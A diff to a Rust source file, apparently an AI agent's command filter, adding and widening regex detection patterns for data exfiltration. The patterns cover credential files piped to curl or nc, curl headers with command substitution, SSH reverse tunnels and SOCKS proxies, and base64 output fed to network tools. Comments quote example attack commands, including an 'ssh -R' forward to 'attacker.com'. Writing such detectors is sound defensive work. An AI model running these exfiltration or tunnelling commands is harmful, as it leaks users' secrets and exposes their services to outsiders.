@@ -373,7 +373,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // are outside the /(etc|var|root) system-file pattern.
             (
                 Regex::new(
-                    r"(cat|head|tail|dd)\s+[^|\n]*?~/\.(bash_history|ssh|aws|gnupg|netrc|gitconfig|kube|docker|npmrc)\S*\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b",
+                    r"(cat|head|tail|dd|ls)\s+[^|\n]*?~/\.(bash_history|ssh|aws|gnupg|netrc|gitconfig|kube|docker|npmrc)\S*\s*(\||;|&&)[\s\S]{0,300}(curl|wget|nc|ncat)\b",
                 )
                 .expect("Invalid regex"),
                 "sensitive home file piped to network tool (exfiltration)",
@@ -392,9 +392,27 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // `curl --header 'X-Sys-Info: $(uname -a | base64)' URL`) —
             // the -d substitution pattern only watches POST data flags.
             (
-                Regex::new(r#"(curl|wget)\s+[^|\n]*--?(header|H)\s+['"][^'"]*\$\("#)
+                Regex::new(r#"(curl|wget)\s+[^|\n]*--?(header|h)\s+['"][^'"]*\$\("#)
                     .expect("Invalid regex"),
                 "command substitution in request header (exfiltration)",
+            ),
+            // SSH tunneling (wave-31: `ssh -R 80:localhost:8080
+            // user@attacker.com` reverse-forwards a local service to the
+            // attacker; `ssh -D` opens a SOCKS proxy). Agent git work goes
+            // through the git tools, not raw ssh.
+            (
+                Regex::new(r"\bssh\s+[^|\n]*-(r|d)\s").expect("Invalid regex"),
+                "ssh tunnel (reverse forward / SOCKS proxy)",
+            ),
+            // Encode-command as the LEADING verb feeding a network tool
+            // (wave-31: `base64 -w 0 config.xml | head -c 500 | curl …`) —
+            // the encoded-pipe pattern needs cat|…|base64 adjacency.
+            (
+                Regex::new(
+                    r"(base64|xxd|od|hexdump)\s+(-[\w]+\s+)*\S+[^|\n]*(\|[^|\n]*)*\|\s*[^|\n]*(curl|wget|nc|ncat)\b",
+                )
+                .expect("Invalid regex"),
+                "encode command feeding network tool (exfiltration)",
             ),
             // Denied env assignments hidden INSIDE interpreter spawn calls
             // (wave-17): `awk 'BEGIN{system("LD_PRELOAD=/tmp/x.so id")}'`,
